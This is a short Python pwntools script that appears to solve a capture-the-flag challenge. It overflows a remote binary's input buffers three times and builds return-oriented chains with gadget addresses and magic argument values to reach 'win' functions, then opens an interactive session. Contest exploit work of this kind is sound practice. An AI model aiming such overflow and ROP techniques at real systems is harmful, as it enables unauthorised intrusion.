from pwn import *
p=remote("connect.umbccd.net",22237)
#p=process("./chall")
p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'> ',b'4')

ret_addr=0x40101a
pop_rdi=0x4017d6
pop_rsi=0x4017d8
pop_rdx=0x4017da

win1=0x401401
win2=0x401314
win3=0x4011e6

p.sendlineafter(b'0x401401\n',b'a'*152+p64(ret_addr)+p64(win1))
p.sendlineafter(b'Continue: \n',b'a'*40+p64(ret_addr)+p64(pop_rdi)+p64(0xDEADBEEF)+p64(win2))
p.sendlineafter(b'Final Test: \n',b'a'*56+p64(ret_addr)+p64(pop_rdi)+p64(0xDEADBEEF)+p64(pop_rsi)+
p64(0xDEAFFACE)+p64(pop_rdx)+p64(0xFEEDCAFE)+p64(win3))
#print(p.recv().decode())
p.interactive()
